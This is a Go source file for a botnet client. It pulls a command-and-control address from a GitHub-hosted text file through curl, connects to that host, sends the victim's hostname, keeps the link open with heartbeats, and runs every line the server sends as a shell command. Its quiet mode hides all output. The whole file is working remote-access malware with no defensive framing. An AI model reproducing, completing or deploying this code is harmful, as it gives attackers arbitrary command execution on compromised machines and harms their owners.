package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const agentURL = "https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main/agent.txt"

func fetchEndpoint(host *string, port *int) bool {
	readLine := func() string {
		f, err := os.Open("agent.txt")
		if err != nil {
			return ""
		}
		defer f.Close()
		s := bufio.NewScanner(f)
		if !s.Scan() {
			return ""
		}
		return s.Text()
	}

	line := readLine()
	if line == "" {
		out, err := exec.Command("curl", "-s", "-m", "5", "-L", agentURL).Output()
		if err != nil {
			return false
		}
		line = strings.TrimSpace(string(out))
	}
	line = strings.TrimRight(strings.TrimSpace(line), "\r\n")
	if line == "" {
		return false
	}

	if idx := strings.Index(line, ":"); idx >= 0 {
		*host = line[:idx]
		fmt.Sscanf(line[idx+1:], "%d", port)
	} else {
		*host = line
		*port = 1337
	}
	return *port > 0 && *host != ""
}

func main() {
	setDebug := true
	if len(os.Args) > 1 && os.Args[1] == "--quiet" {
		setDebug = false
	}

	dbg := func(format string, a ...interface{}) {
		if setDebug {
			fmt.Printf(format+"\n", a...)
		}
	}

	host, port := "127.0.0.1", 1337
	hostname, _ := os.Hostname()

	dbg("[+] Bot initialized (Hostname: %s)", hostname)

	if fetchEndpoint(&host, &port) {
		dbg("[+] Target Agent endpoint: %s:%d", host, port)
	} else {
		host, port = "127.0.0.1", 1337
		dbg("[!] Failed to read agent.txt, using default %s:%d", host, port)
	}

	lastCheck := time.Now()

	for {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, fmt.Sprint(port)), 5*time.Second)
		if err != nil {
			dbg("[-] Connection to %s:%d failed (%v). Retrying in 3s...", host, port, err)
			fetchEndpoint(&host, &port)
			time.Sleep(3 * time.Second)
			continue
		}

		fmt.Fprintf(conn, "HELLO %s\n", hostname)
		dbg("[+] Connected to Agent (%s:%d)! Handshaking...", host, port)

		reader := bufio.NewReader(conn)

		for {
			_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			msg, err := reader.ReadString('\n')
			if err != nil {
				if nerr, ok := err.(net.Error); ok && nerr.Timeout() {
					dbg("[*] Heartbeat: PING -> Agent")
					fmt.Fprintf(conn, "PING\n")
					continue
				}
				dbg("[-] Server closed connection (%v).", err)
				break
			}

			line := strings.TrimRight(msg, "\r\n")
			switch {
			case strings.HasPrefix(line, "PONG"):
				dbg("[+] Heartbeat: PONG <- Agent")
			case strings.HasPrefix(line, "SSH-"):
				dbg("[+] Heartbeat: SSH banner ignored")
			case strings.TrimSpace(line) != "":
				dbg("[+] Command masuk: %s", line)
				go func(cmd string) {
					defer func() { recover() }()
					c := exec.Command("sh", "-c", cmd)
					c.Stdout = os.Stdout
					c.Stderr = os.Stderr
					_ = c.Start()
					_ = c.Wait()
				}(line)
			}

			if time.Since(lastCheck) >= 10*time.Second {
				lastCheck = time.Now()
				var nHost string
				var nPort int
				if fetchEndpoint(&nHost, &nPort) {
					if nHost != host || nPort != port {
						dbg("[*] Endpoint updated to %s:%d, reconnecting...", nHost, nPort)
						host, port = nHost, nPort
						break
					}
				}
			}
		}

		conn.Close()
		fetchEndpoint(&host, &port)
		time.Sleep(3 * time.Second)
	}
}